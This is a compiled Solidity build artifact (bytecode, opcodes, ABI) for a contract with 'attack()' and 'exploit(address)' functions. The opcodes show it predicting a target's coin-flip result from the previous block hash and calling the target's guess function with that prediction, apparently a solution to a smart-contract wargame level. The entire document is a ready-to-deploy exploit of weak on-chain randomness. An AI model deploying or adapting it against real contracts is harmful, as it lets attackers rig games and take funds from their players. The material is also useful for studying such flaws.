{
	"data": {
		"bytecode": {
			"linkReferences": {},
			"object": "608060405234801561001057600080fd5b506103fc806100206000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80630aeb4ddf1461003b5780639e5faafc14610057575b600080fd5b6100556004803603810190610050919061023d565b610061565b005b61005f6100a4565b005b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b6000806100bb6001436101ae90919063ffffffff16565b4060001c90506100f47f8000000000000000000000000000000000000000000000000000000000000000826101c490919063ffffffff16565b915060006001831461010757600061010a565b60015b905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f67826040518263ffffffff1660e01b81526004016101659190610285565b6020604051808303816000875af1158015610184573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101a891906102cc565b50505050565b600081836101bc9190610332565b905092915050565b600081836101d29190610395565b905092915050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061020a826101df565b9050919050565b61021a816101ff565b811461022557600080fd5b50565b60008135905061023781610211565b92915050565b600060208284031215610253576102526101da565b5b600061026184828501610228565b91505092915050565b60008115159050919050565b61027f8161026a565b82525050565b600060208201905061029a6000830184610276565b92915050565b6102a98161026a565b81146102b457600080fd5b50565b6000815190506102c6816102a0565b92915050565b6000602082840312156102e2576102e16101da565b5b60006102f0848285016102b7565b91505092915050565b6000819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600061033d826102f9565b9150610348836102f9565b92508282101561035b5761035a610303565b5b828203905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b60006103a0826102f9565b91506103ab836102f9565b9250826103bb576103ba610366565b5b82820490509291505056fea26469706673582212200aa30d9fe279edcf51a8320e7de121b3c6de98f767f9aac2feb3419e1506fafb64736f6c634300080d0033",
			"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x3FC DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xAEB4DDF EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x57 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x55 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x23D JUMP JUMPDEST PUSH2 0x61 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x5F PUSH2 0xA4 JUMP JUMPDEST STOP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH2 0xBB PUSH1 0x1 NUMBER PUSH2 0x1AE SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR SWAP1 POP PUSH2 0xF4 PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 DUP3 PUSH2 0x1C4 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST SWAP2 POP PUSH1 0x0 PUSH1 0x1 DUP4 EQ PUSH2 0x107 JUMPI PUSH1 0x0 PUSH2 0x10A JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x165 SWAP2 SWAP1 PUSH2 0x285 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x184 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x1A8 SWAP2 SWAP1 PUSH2 0x2CC JUMP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 DUP4 PUSH2 0x1BC SWAP2 SWAP1 PUSH2 0x332 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 DUP4 PUSH2 0x1D2 SWAP2 SWAP1 PUSH2 0x395 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x20A DUP3 PUSH2 0x1DF JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x21A DUP2 PUSH2 0x1FF JUMP JUMPDEST DUP2 EQ PUSH2 0x225 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x237 DUP2 PUSH2 0x211 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x253 JUMPI PUSH2 0x252 PUSH2 0x1DA JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x261 DUP5 DUP3 DUP6 ADD PUSH2 0x228 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x27F DUP2 PUSH2 0x26A JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x29A PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x276 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x2A9 DUP2 PUSH2 0x26A JUMP JUMPDEST DUP2 EQ PUSH2 0x2B4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x2C6 DUP2 PUSH2 0x2A0 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x2E2 JUMPI PUSH2 0x2E1 PUSH2 0x1DA JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x2F0 DUP5 DUP3 DUP6 ADD PUSH2 0x2B7 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x33D DUP3 PUSH2 0x2F9 JUMP JUMPDEST SWAP2 POP PUSH2 0x348 DUP4 PUSH2 0x2F9 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x35B JUMPI PUSH2 0x35A PUSH2 0x303 JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x3A0 DUP3 PUSH2 0x2F9 JUMP JUMPDEST SWAP2 POP PUSH2 0x3AB DUP4 PUSH2 0x2F9 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x3BB JUMPI PUSH2 0x3BA PUSH2 0x366 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 EXP LOG3 0xD SWAP16 0xE2 PUSH26 0xEDCF51A8320E7DE121B3C6DE98F767F9AAC2FEB3419E1506FAFB PUSH5 0x736F6C6343 STOP ADDMOD 0xD STOP CALLER "
		},
		"gasEstimates": {
			"creation": {
				"codeDepositCost": "204000",
				"executionCost": "245",
				"totalCost": "204245"
			},
			"external": {
				"attack()": "infinite",
				"exploit(address)": "24700"
			}
		},
		"methodIdentifiers": {
			"attack()": "9e5faafc",
			"exploit(address)": "0aeb4ddf"
		}
	},
	"abi": [
		{
			"inputs": [],
			"name": "attack",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"inputs": [
				{
					"internalType": "address",
					"name": "_contract",
					"type": "address"
				}
			],
			"name": "exploit",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		}
	]
}